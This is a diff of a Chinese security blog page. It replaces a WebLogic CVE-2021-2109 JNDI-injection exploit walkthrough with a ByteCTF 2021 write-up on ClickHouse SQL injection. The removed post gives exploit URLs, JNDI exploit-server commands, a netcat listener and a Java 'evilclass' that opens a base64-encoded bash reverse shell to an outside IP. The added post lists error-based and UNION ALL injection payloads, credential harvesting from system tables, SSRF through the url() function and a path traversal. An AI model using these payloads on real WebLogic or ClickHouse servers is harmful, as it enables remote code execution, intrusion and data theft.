@@ -22,7 +22,7 @@
     <meta name="description" content="信息安全技术博客">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>weblogic cve-2021-2109 jndi注入 远程代码执行复现 · c1ay&#39;s blog</title>
+    <title>通过2021 ByteCTF double sqli初探clickghouse sqli · c1ay&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >c1ay&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">weblogic cve-2021-2109 jndi注入 远程代码执行复现</a>
+                <a href="#" class="post-name">通过2021 ByteCTF double sqli初探clickghouse sqli</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            weblogic cve-2021-2109 jndi注入 远程代码执行复现
+            通过2021 ByteCTF double sqli初探clickghouse sqli
             <!-- 404 -->
             
         </h1>
@@ -266,18 +266,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞复现">漏洞复现</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">450</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2021/01/22</span>
+                    <span class="post-intro-time">2021/10/19</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,52 +401,97 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><pre><code>Weblogic Server 10.3.6.0.0
-Weblogic Server 12.1.3.0.0
-Weblogic Server 12.2.1.3.0
-Weblogic Server 12.2.1.4.0
-Weblogic Server 14.1.1.0.0
-</code></pre><h1 id="利用方式一：无回显利用-反弹shell"><a href="#利用方式一：无回显利用-反弹shell" class="headerlink" title="利用方式一：无回显利用-反弹shell"></a>利用方式一：无回显利用-反弹shell</h1><p>1、工具github地址：<br><a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases" target="_blank" rel="external">https://github.com/welk1n/JNDI-Injection-Exploit/releases</a></p>
-<p>vps上执行:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">"反弹shell的命令"</span> -A <span class="string">"vpsip"</span></div></pre></td></tr></table></figure>
-<p><img src="http://pic.c1imber.top/blog/20210122/bMC5lPgmWyip.png?imageslim" alt="mark"></p>
-<p>vps监听端口：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nvlp 8888</div></pre></td></tr></table></figure>
-<p>poc:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="comment">//192.168.157.189:49163/console/css/%252E%252E%252Fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://4x.xxx.xxx;xxx:1389/01hohc;AdminServer%22)</span></div></pre></td></tr></table></figure>
-<p>反弹成功</p>
-<p><img src="http://pic.c1imber.top/blog/20210122/8eeWBm7dSXuQ.png?imageslim" alt="mark"></p>
-<p>2、也可以直接通过marshalsec-0.0.3-SNAPSHOT-all.jar这个工具进行复现：</p>
-<p>vps上执行：</p>
-<p>启动JNDI服务</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -cp marshalsec-<span class="number">0.0</span>.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="comment">//vpsip:8080/#evilclass</span></div></pre></td></tr></table></figure>
-<p>启动HTTPServer:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m SimpleHTTPServer 8080</div></pre></td></tr></table></figure>
-<p>http目录下放置恶意class文件，evilclass.class源码如下： </p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.lang.Runtime;</div><div class="line"><span class="keyword">import</span> java.lang.Process;   </div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evilclass</span> </span>&#123;    </div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">evilclass</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            String commands = <span class="string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDUuMTg2LjE0Ni84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span>;</div><div class="line">            Process pc = Runtime.getRuntime().exec(commands);</div><div class="line">            pc.waitFor();</div><div class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;   </div><div class="line"></div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</div><div class="line">        evilclass e = <span class="keyword">new</span> evilclass();</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>vps监听端口：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nvlp 8888</div></pre></td></tr></table></figure>
-<p>poc:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="comment">//192.168.157.189:49163/console/css/%252E%252E%252Fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://4x.xxx.xxx;xxx:1389/evilclass;AdminServer%22)</span></div></pre></td></tr></table></figure>
-<p><img src="http://pic.c1imber.top/blog/20210122/3YFpDGLcyPuU.png?imageslim" alt="mark"></p>
-<p><img src="http://pic.c1imber.top/blog/20210122/Ji8u3iMI39tW.png?imageslim" alt="mark"></p>
-<p><img src="http://pic.c1imber.top/blog/20210122/tTHQ753svyST.png?imageslim" alt="mark"></p>
-<h1 id="利用方式二：回显利用"><a href="#利用方式二：回显利用" class="headerlink" title="利用方式二：回显利用"></a>利用方式二：回显利用</h1><p>工具github地址：<br><a href="https://github.com/feihong-cs/JNDIExploit/releases/" target="_blank" rel="external">https://github.com/feihong-cs/JNDIExploit/releases/</a></p>
-<p>vps上执行：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -jar JNDIExploit-v1.11.jar -i vpsip</div></pre></td></tr></table></figure>
-<p><img src="http://pic.c1imber.top/blog/20210122/6EClOmzC4Fxr.png?imageslim" alt="mark"></p>
-<p>poc:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /console/css/%<span class="number">252</span>E%<span class="number">252</span>E%<span class="number">252F</span>consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=<span class="keyword">true</span>&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%<span class="number">22l</span>dap:<span class="comment">//4x.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1</span></div><div class="line">Host: <span class="number">192.168</span>.157.189:<span class="number">49163</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">74.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">74.0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></div><div class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></div><div class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></div><div class="line"><span class="comment">Connection: close</span></div><div class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></div><div class="line"><span class="comment">cmd: whoami</span></div></pre></td></tr></table></figure>
-<p><img src="http://pic.c1imber.top/blog/20210122/W783nH3AaIFL.png?imageslim" alt="mark"></p>
+        <h1 id="通过2021-ByteCTF-double-sqli初探clickghouse-sqli"><a href="#通过2021-ByteCTF-double-sqli初探clickghouse-sqli" class="headerlink" title="通过2021 ByteCTF double sqli初探clickghouse sqli"></a>通过2021 ByteCTF double sqli初探clickghouse sqli</h1><p>通过该题顺便学习了一波clickhouse注入<br>根据数据库报错得知是clickhouse数据库：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1'</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/sPG3sQ7NFcBB.png?imageslim" alt="mark"></p>
+<p><strong>官方文档：</strong><br><a href="https://clickhouse.com/docs/zh/" target="_blank" rel="external">https://clickhouse.com/docs/zh/</a></p>
+<p><strong>SQL注入资料：</strong><br><a href="https://blog.deteact.com/yandex-clickhouse-injection/" target="_blank" rel="external">https://blog.deteact.com/yandex-clickhouse-injection/</a></p>
+<p><strong>从资料当中得到两点比较重要的：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、与某些 SQL 方言不同，ClickHouse 具有严格的类型。类型之间没有隐式转换。</div><div class="line">2、ClickHouse 不支持标准的 UNION，只支持 UNION ALL 来合并请求</div></pre></td></tr></table></figure></p>
+<p>可以得到两种注入方法：</p>
+<h3 id="1、通过强类型进行报错注入，这点类似于sqlserver的报错注入："><a href="#1、通过强类型进行报错注入，这点类似于sqlserver的报错注入：" class="headerlink" title="1、通过强类型进行报错注入，这点类似于sqlserver的报错注入："></a>1、通过强类型进行报错注入，这点类似于sqlserver的报错注入：</h3><p><strong>比较运算：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20and%201=version()</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/CgkWGI8n1GzT.png?imageslim" alt="mark"></p>
+<p><code>Cannot convert string 21.3.2.5 to type UInt8</code></p>
+<p><strong>类型转换：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20and%20cast(version()%20as%20int)</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/n3SCDGRbQSMj.png?imageslim" alt="mark"></p>
+<p><code>Cannot parse string &#39;21.3.2.5&#39; as Int32</code></p>
+<p>获得版本号为21.3.2.5</p>
+<h3 id="2、通过union-all进行回显注入，注意前后字段不仅数量要一致，类型也要一致，类型不一致的需要用cast进行类型转换"><a href="#2、通过union-all进行回显注入，注意前后字段不仅数量要一致，类型也要一致，类型不一致的需要用cast进行类型转换" class="headerlink" title="2、通过union all进行回显注入，注意前后字段不仅数量要一致，类型也要一致，类型不一致的需要用cast进行类型转换"></a>2、通过union all进行回显注入，注意前后字段不仅数量要一致，类型也要一致，类型不一致的需要用cast进行类型转换</h3><p>也可以通过<code>union all</code>通过报错获取数据表的列名，当前后字段数不一致时，会将表中的字段名报错出来，例如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20*%20from%20system.databases</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/lrVJN1Ng3rY4.png?imageslim" alt="mark"></p>
+<p>可以看到通过报错获取了<code>system.databases</code>表中的字段名有name, engine, data_path, metadata_path, uuid，至于这个表是做什么的后面会说</p>
+<h3 id="获取当前用户名："><a href="#获取当前用户名：" class="headerlink" title="获取当前用户名："></a>获取当前用户名：</h3><p><code>system.processes</code>可以查看当前数据库进程的一些信息，例如进行查询的用户、执行的语句等<br><img src="http://pic.c1imber.top/blog/20211019/8THhIPPX8mc0.png?imageslim" alt="mark"></p>
+<p>所以可以从<code>system.processes</code>获取当前数据库用户名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20user%20from%20system.processes</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/hH8bhDG0yB2w.png?imageslim" alt="mark"></p>
+<p>当前用户为user_02</p>
+<h3 id="获取数据库名："><a href="#获取数据库名：" class="headerlink" title="获取数据库名："></a>获取数据库名：</h3><p>从系统表<code>system.databases</code>当中获得当前用户可以看到的数据库名（类似于mysql当中的<code>information_schema.schemata</code>）<br><img src="http://pic.c1imber.top/blog/20211019/trXKwjncT6Ta.png?imageslim" alt="mark"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20name%20from%20system.databases</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/vWrz7wHiRvoH.png?imageslim" alt="mark"></p>
+<p>获取到数据库名有ctf、default</p>
+<h3 id="获取表名："><a href="#获取表名：" class="headerlink" title="获取表名："></a>获取表名：</h3><p>可以通过<code>system.tables</code>（类似于mysql当中的<code>information_schema.tables</code>）<br><img src="http://pic.c1imber.top/blog/20211019/Tn0DeqC0rp0w.png?imageslim" alt="mark"></p>
+<p>获取所有可以看到的表名hint、hello</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20name%20from%20system.tables</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/7A3GuLL1XrJ1.png?imageslim" alt="mark"></p>
+<p>获取ctf下的表名为hint</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20name%20from%20system.tables%20where%20database=%27ctf%27</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/BUA49FXmVMae.png?imageslim" alt="mark"></p>
+<p>获取default下的表名为hello</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20name%20from%20system.tables%20where%20database=%27default%27</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/S9WpAC8KNcXW.png?imageslim" alt="mark"></p>
+<h3 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名:"></a>获取列名:</h3><p>可以通过<code>system.columns</code>（类似于mysql当中的<code>information_schema.columns</code>）<br><img src="http://pic.c1imber.top/blog/20211019/ladOaqYa2o6N.png?imageslim" alt="mark"></p>
+<p>获取所有可以看到的列名为id、ByteCTF</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20name%20from%20system.columns</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/viO714gl5Irx.png?imageslim" alt="mark"></p>
+<p>获取<code>ctf.hint</code>下的列名为id：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20name%20from%20system.columns%20where%20database=%27ctf%27%20and%20table=%27hint%27</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/w1Nv4H3lxbRR.png?imageslim" alt="mark"></p>
+<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据:"></a>获取数据:</h3><p>获取<code>ctf.hint</code>当中的提示：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20id%20from%20ctf.hint</div></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20*%20from%20ctf.hint</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/EhkiV4YJSqe2.png?imageslim" alt="mark"></p>
+<p>hint说没有权限获取flag</p>
+<p><code>you_dont_have_permissions_to_read_flag</code></p>
+<p>尝试读一下<code>ctf.flag</code>，当前用户user_02确实是没有权限</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20*%20from%20ctf.flag</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/85s1Abg1ovYd.png?imageslim" alt="mark"></p>
+<p>根据这道题的名字double sqli，看来需要先拿到其他有权限用户的账号密码进行注入</p>
+<p>题目一开始给了提示</p>
+<p><img src="http://pic.c1imber.top/blog/20211019/k2WcI6uNk4Tp.png?imageslim" alt="mark"></p>
+<p>something in files指的应该是对应链接的一张图片，无奈自己这里没看出里面藏有什么</p>
+<p>尝试用file函数读文件也无果，限制了目录</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20file(%27/etc/passwd%27)</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/DQnoCfypMRi1.png?imageslim" alt="mark"></p>
+<p>只允许/var/lib/clickhouse/user_files/目录</p>
+<h3 id="非预期解？"><a href="#非预期解？" class="headerlink" title="非预期解？"></a>非预期解？</h3><p>最终在<code>system.processes</code>表的<code>query</code>当中看到了user_02和user_01的密码，上面也说了<code>system.processes</code>的<code>query</code>当中记录了当前执行的查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20query%20from%20system.processes</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/4WKNh0tqmlxb.png?imageslim" alt="mark"></p>
+<p>user_02 e4649b934ca495991b78</p>
+<p>user_01 e3b0c44298fc1c149afb</p>
+<p>而cilckhouse支持通过http客户端进行查询，并且该题目url函数没被禁用</p>
+<p><strong>http客户端接口：</strong><br><img src="http://pic.c1imber.top/blog/20211019/P72zAS3nRPVA.png?imageslim" alt="mark"></p>
+<p><strong>url表函数：</strong><br><img src="http://pic.c1imber.top/blog/20211019/FSYbmFFI5eUa.png?imageslim" alt="mark"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20*%20from%20url(%27http://127.0.0.1:8123%27,CSV,%27col%20String%27)</div></pre></td></tr></table></figure>
+<p>可以看到返回了OK，http客户端可以正常请求clickhouse server</p>
+<p><img src="http://pic.c1imber.top/blog/20211019/SUd943rcBisj.png?imageslim" alt="mark"></p>
+<p>通过url表函数和http客户端切换数据库用户为user_01，成功查询出了ctf.flag（注意URL的编码问题）</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/?id=1%20union%20all%20select%20*%20from%20url(%27http://127.0.0.1:8123?user=user_01%26password=e3b0c44298fc1c149afb%26query=select%2520*%2520from%2520ctf.flag;%27,CSV,%27col%20String%27)</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/aYTFjCn78Urh.png?imageslim" alt="mark"></p>
+<p>flag:<br><code>ByteCTF{e3b0c44298fc1c149afbf4c8}</code></p>
+<h3 id="赛后补充："><a href="#赛后补充：" class="headerlink" title="赛后补充："></a>赛后补充：</h3><p>赛后看了其他师傅的wp，预期解是穿越目录获取的user_01密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.105.175.150:30001/files../var/lib/clickhouse/access/3349ea06-b1c1-514f-e1e9-c8d6e8080f89.sql</div></pre></td></tr></table></figure>
+<p><img src="http://pic.c1imber.top/blog/20211019/uipA5M2398my.png?imageslim" alt="mark"></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="https://c1aysec.github.io">c1ay</a>
-            <p>原文链接：<a href="https://c1aysec.github.io/2021/01/22/weblogic cve-2021-2109 jndi注入 远程代码执行复现/">https://c1aysec.github.io/2021/01/22/weblogic cve-2021-2109 jndi注入 远程代码执行复现/</a>
-            <p>发表日期：<a href="https://c1aysec.github.io/2021/01/22/weblogic cve-2021-2109 jndi注入 远程代码执行复现/">January 22nd 2021, 1:06:33 am</a>
-            <p>更新日期：<a href="https://c1aysec.github.io/2021/01/22/weblogic cve-2021-2109 jndi注入 远程代码执行复现/">January 25th 2021, 12:17:09 pm</a>
+            <p>原文链接：<a href="https://c1aysec.github.io/2021/10/19/通过2021 ByteCTF double sqli初探clickghouse sqli/">https://c1aysec.github.io/2021/10/19/通过2021 ByteCTF double sqli初探clickghouse sqli/</a>
+            <p>发表日期：<a href="https://c1aysec.github.io/2021/10/19/通过2021 ByteCTF double sqli初探clickghouse sqli/">October 19th 2021, 10:43:27 am</a>
+            <p>更新日期：<a href="https://c1aysec.github.io/2021/10/19/通过2021 ByteCTF double sqli初探clickghouse sqli/">October 19th 2021, 11:06:20 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -454,17 +499,12 @@ Weblogic Server 14.1.1.0.0
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2021/01/27/shellcode-uuid免杀/" title= "shellcode-uuid免杀">
-                    <div class="nextTitle">shellcode-uuid免杀</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2021/01/22/Seeyon-OA getshell漏洞复现和payload构造/" title= "Seeyon-OA getshell漏洞复现和payload构造">
-                    <div class="prevTitle">Seeyon-OA getshell漏洞复现和payload构造</div>
+                <a href= "/2021/04/29/2021HW总结-网康NS-NGFW rce复现分析/" title= "2021HW总结-网康NS-NGFW rce复现分析">
+                    <div class="prevTitle">2021HW总结-网康NS-NGFW rce复现分析</div>
                 </a>
             
         </li>
@@ -579,7 +619,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#影响版本"><span class="toc-number">1.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用方式一：无回显利用-反弹shell"><span class="toc-number">2.</span> <span class="toc-text">利用方式一：无回显利用-反弹shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#利用方式二：回显利用"><span class="toc-number">3.</span> <span class="toc-text">利用方式二：回显利用</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#通过2021-ByteCTF-double-sqli初探clickghouse-sqli"><span class="toc-number">1.</span> <span class="toc-text">通过2021 ByteCTF double sqli初探clickghouse sqli</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、通过强类型进行报错注入，这点类似于sqlserver的报错注入："><span class="toc-number">1.0.1.</span> <span class="toc-text">1、通过强类型进行报错注入，这点类似于sqlserver的报错注入：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、通过union-all进行回显注入，注意前后字段不仅数量要一致，类型也要一致，类型不一致的需要用cast进行类型转换"><span class="toc-number">1.0.2.</span> <span class="toc-text">2、通过union all进行回显注入，注意前后字段不仅数量要一致，类型也要一致，类型不一致的需要用cast进行类型转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取当前用户名："><span class="toc-number">1.0.3.</span> <span class="toc-text">获取当前用户名：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取数据库名："><span class="toc-number">1.0.4.</span> <span class="toc-text">获取数据库名：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取表名："><span class="toc-number">1.0.5.</span> <span class="toc-text">获取表名：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取列名"><span class="toc-number">1.0.6.</span> <span class="toc-text">获取列名:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取数据"><span class="toc-number">1.0.7.</span> <span class="toc-text">获取数据:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#非预期解？"><span class="toc-number">1.0.8.</span> <span class="toc-text">非预期解？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#赛后补充："><span class="toc-number">1.0.9.</span> <span class="toc-text">赛后补充：</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
